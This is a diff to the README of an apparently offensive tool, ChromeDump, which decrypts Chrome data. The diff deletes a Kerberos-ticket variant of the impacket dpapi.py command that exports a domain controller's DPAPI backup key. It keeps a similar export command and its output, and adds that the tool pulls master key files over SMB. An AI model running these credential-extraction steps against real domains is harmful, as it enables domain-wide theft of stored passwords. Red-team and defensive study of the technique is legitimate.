@@ -82,22 +82,11 @@ dpapi.py backupkeys --export \
     -dc-ip 10.0.0.1
 ```
 
-With a Kerberos ticket (pass-the-hash or ticket impersonation):
-
-```bash
-export KRB5CCNAME=Administrator@cifs_DC01.ccache
-
-dpapi.py backupkeys --export \
-    -t 'Administrator@DC01.corp.local' \
-    -k -no-pass \
-    -dc-ip 10.0.0.1
-```
-
 ```
 [*] Exporting domain backupkey to file G$BCKUPKEY_<GUID>.pvk
 ```
 
-That PVK file is all the tool needs. Pass it via `--pvk`.
+That PVK file is all the tool needs. ChromeDump pulls the master key files from the target over SMB and decrypts them internally. Pass the PVK via `--pvk`.
 
 ## Installation
 
